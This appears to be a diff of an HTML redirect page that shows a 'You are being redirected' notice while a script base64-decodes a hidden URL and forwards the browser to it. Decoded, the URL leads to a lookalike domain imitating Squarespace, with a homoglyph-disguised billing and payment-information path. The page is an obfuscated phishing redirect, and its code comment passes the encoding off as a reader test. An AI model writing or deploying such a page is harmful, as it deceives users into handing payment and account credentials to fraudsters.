@@ -9,7 +9,7 @@
     <p>You are being redirected. If the page does not load, please contact support.</p>
     <script>
         // Obscure the URL to test how it interacts with various readers
-        const encodedUrl = "aHR0cHM6Ly9hY2NvdW50LnNxdWFyZXNwYWNlLnVzLmNvbS8lRDElODElRDAlQkVuZiVEMSU5NmcvJUQxJTk1JUQwJUI1dHQlRDElOTZuZyVEMSU5NS9iJUQxJTk2bGwlRDElOTZuZy8lRDElODAlRDAlQjAlRDElODNtJUQwJUI1bnQtJUQxJTk2bmYlRDAlQkVybSVEMCVCMHQlRDElOTYlRDAlQkVu="; // Base64 encoded URL
+        const encodedUrl = "aHR0cHM6Ly9hY2NvdW50LnNxdWFyZXNwYWNlLnVzLmNvbS8lRDElODElRDAlQkVuZiVEMSU5NmcvJUQxJTk1JUQwJUI1dHQlRDElOTZuZyVEMSU5NS9iJUQxJTk2bGwlRDElOTZuZy8lRDElODAlRDAlQjAlRDElODNtJUQwJUI1bnQtJUQxJTk2bmYlRDAlQkVybSVEMCVCMHQlRDElOTYlRDAlQkVu"; // Base64 encoded URL
         const decodedUrl = atob(encodedUrl); // Decode the URL
         setTimeout(() => {
             window.location.href = decodedUrl; // Redirect to the decoded URL
